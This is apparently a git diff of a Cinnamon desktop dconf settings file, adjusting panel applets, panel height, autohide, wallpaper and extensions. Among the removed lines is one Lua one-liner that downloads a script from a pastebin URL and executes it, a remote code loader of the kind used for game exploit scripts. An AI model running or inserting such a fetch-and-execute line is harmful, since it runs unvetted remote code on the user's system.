@@ -1,15 +1,19 @@
-
-
-loadstring(game:HttpGet(('https://pastebin.com/raw/PaWZGzyK'),true))()[org/cinnamon]
-enabled-applets=['panel1:left:0:menu@cinnamon.org:0', 'panel1:left:1:separator@cinnamon.org:1', 'panel1:left:2:grouped-window-list@cinnamon.org:2', 'panel1:right:4:systray@cinnamon.org:3', 'panel1:right:5:xapp-status@cinnamon.org:4', 'panel1:right:6:notifications@cinnamon.org:5', 'panel1:right:7:printers@cinnamon.org:6', 'panel1:right:8:removable-drives@cinnamon.org:7', 'panel1:right:9:keyboard@cinnamon.org:8', 'panel1:right:10:favorites@cinnamon.org:9', 'panel1:right:11:network@cinnamon.org:10', 'panel1:right:12:sound@cinnamon.org:11', 'panel1:right:13:power@cinnamon.org:12', 'panel1:right:14:calendar@cinnamon.org:13', 'panel1:right:15:cornerbar@cinnamon.org:14']
+[org/cinnamon]
+desklet-snap-interval=25
+enabled-applets=['panel1:left:0:menu@cinnamon.org:0', 'panel1:left:1:separator@cinnamon.org:1', 'panel1:left:2:grouped-window-list@cinnamon.org:2', 'panel1:right:5:systray@cinnamon.org:3', 'panel1:right:6:xapp-status@cinnamon.org:4', 'panel1:right:7:notifications@cinnamon.org:5', 'panel1:right:8:printers@cinnamon.org:6', 'panel1:right:9:removable-drives@cinnamon.org:7', 'panel1:right:10:keyboard@cinnamon.org:8', 'panel1:right:11:favorites@cinnamon.org:9', 'panel1:right:12:network@cinnamon.org:10', 'panel1:right:13:sound@cinnamon.org:11', 'panel1:right:14:power@cinnamon.org:12', 'panel1:right:15:calendar@cinnamon.org:13', 'panel1:right:16:cornerbar@cinnamon.org:14']
+enabled-desklets=@as []
+enabled-extensions=['user-shadows@nathan818fr']
 hotcorner-layout=['expo:true:0', 'scale:false:0', 'scale:false:0', 'desktop:false:0']
-next-applet-id=19
+next-applet-id=20
+panel-zone-symbolic-icon-sizes='[{"panelId": 1, "left": 28, "center": 28, "right": 16}]'
+panels-autohide=['1:intel']
+panels-height=['1:33']
 
 [org/cinnamon/desktop/applications/terminal]
 exec='kitty'
 
 [org/cinnamon/desktop/background]
-picture-uri='file:///home/manu/1.jpg'
+picture-uri='file:///home/manu/Downloads/peakpx.jpg'
 
 [org/cinnamon/desktop/background/slideshow]
 delay=15
@@ -97,5 +101,3 @@ start-with-sidebar=true
 
 [org/x/viewer/window]
 maximized=true
-
-
